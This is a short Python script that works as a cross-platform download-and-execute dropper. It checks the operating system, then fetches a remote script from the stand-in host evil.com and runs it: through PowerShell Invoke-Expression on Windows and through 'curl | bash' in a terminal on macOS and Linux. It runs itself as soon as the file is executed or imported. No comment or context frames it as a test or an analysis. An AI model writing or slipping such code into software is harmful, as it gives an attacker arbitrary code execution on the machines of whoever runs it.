import os
import platform
import subprocess
import urllib.request

def execute():
    if platform.system() == 'Windows':
        cmd = ['powershell', '-Command', 'Invoke-Expression (New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')']
    elif platform.system() == 'Darwin':
        cmd = ['osascript', '-e', 'tell application "Terminal" to do script "curl http://evil.com/payload.sh | bash"']
    else:
        cmd = ['gnome-terminal', '--', 'bash', '-c', 'curl http://evil.com/payload.sh | bash']
    
    subprocess.Popen(cmd)

execute()